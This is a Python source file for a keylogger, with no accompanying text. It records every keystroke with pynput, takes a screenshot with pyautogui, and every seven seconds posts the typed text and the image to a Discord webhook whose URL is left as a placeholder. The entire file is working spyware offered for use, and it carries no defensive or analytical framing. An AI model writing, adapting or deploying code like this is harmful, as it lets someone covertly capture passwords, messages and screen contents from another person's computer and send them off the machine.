from pynput.keyboard import Key, Listener # pip install pynput
import requests # pip install requests
import threading
import pyautogui # pip install pyautogui
import base64

text = ""
webhook_url = "discord_webhook_url"
time_interval = 7

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

def send_data():
    global text
    take_screenshot()

    # Prepare the payload for the text content
    data = {
        "content": f"```\n{text}\n```",
        "title": "key_logger"
    }

    # Open the screenshot file in binary mode
    with open("screenshot.png", "rb") as image_file:
        files = {
            "file": image_file
        }

        try:
            # Send the text and screenshot as a multipart/form-data request
            requests.post(webhook_url, data=data, files=files)
        except Exception as e:
            print(f"Failed to send data: {e}")

    # Schedule the next execution
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    try:
        if key == Key.space:
            text += " "
        elif key == Key.enter:
            text += "\n"
        elif key == Key.tab:
            text += "\t"
        elif key == Key.backspace:
            text = text[:-1] if text else text
        elif key == Key.esc:
            return False
        else:
            text += key.char
    except AttributeError:
        text += f" [{key}] "

with Listener(on_press=on_press) as listener:
    send_data()
    listener.join()
